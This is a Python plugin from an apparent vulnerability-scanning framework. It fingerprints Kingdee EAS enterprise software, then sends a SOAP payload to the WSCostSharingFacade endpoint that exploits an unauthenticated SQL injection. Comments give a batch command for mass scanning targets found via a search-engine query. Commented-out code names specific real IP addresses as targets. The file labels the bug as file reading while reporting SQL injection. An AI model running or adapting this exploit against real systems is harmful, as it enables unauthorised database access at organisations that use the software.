# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 13:19

from core.data import gLogger
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
from exploit.scripts import BaseScript


# "kingdee" && country="CN"
# python3 batch.py -m exploit.scripts.OA.Kingdee.unauth_sql_injection_WSCostSharingFacade -cs -fs "app=\"Kingdee-EAS\""

class Script(BaseScript):
    name = 'Kingdee'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.READFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = 'https://www.cnblogs.com/0day-li/p/14642199.html'
        # 特定路径判断
        self.detect_path_list = ['/']
        # priority
        self.priority = 1
        # exec
        self.exec_path_list = ['/ormrpc/services/WSCostSharingFacade']
        # 相关信息
        self.info = ''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                    if response is not None:
                        await asyncio.sleep(2)
                        text = await response.text(encoding='utf-8', errors='ignore')
                        if ('Kingdee.EntryRole' in text and 'loginKDLogo' in text) or '金蝶国际软件集团有限公司版权所有' in text or '''var formidafterlogin = '"bos_mainconsolesutra"''' in text or 'class="kd-div-loading-ct"' in text or 'logo-kingdee.png' in text or 'eassessionid' in text or '/eassso/common' in text:
                            self.flag = True
                            gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                            return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'SOAPAction': '"getIndexValue"'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path }'
                data = r"""
                <?xml version='1.0' encoding='UTF-8'?>
                <soapenv:Envelope
                    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
                    <soapenv:Body>
                        <getIndexValue>
                            <arg0>GX</arg0>
                            <arg1>SELECT count(*) as total FROM t_ssc_jobhis where FJOBPOOLINGTYPE =3 and fsharecenterid='3NsAAAauhCbM567U' and FCOMPLETETME between {ts'2021-01-01 00:00:00'} and  {ts'2021-12-31 23:59:59'}</arg1>
                            <arg2>total</arg2>
                        </getIndexValue>
                    </soapenv:Body>
                </soapenv:Envelope>
                """
                async with session.post(url=url, data=data, timeout=self.req_timeout, verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                        return {'name': 'Kingdee WSCostSharingFacade SqlInjection', 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
    # import requests
    # import hashlib
    #
    # resp = requests.get('http://125.64.61.123:8088/C6/image/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    # #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
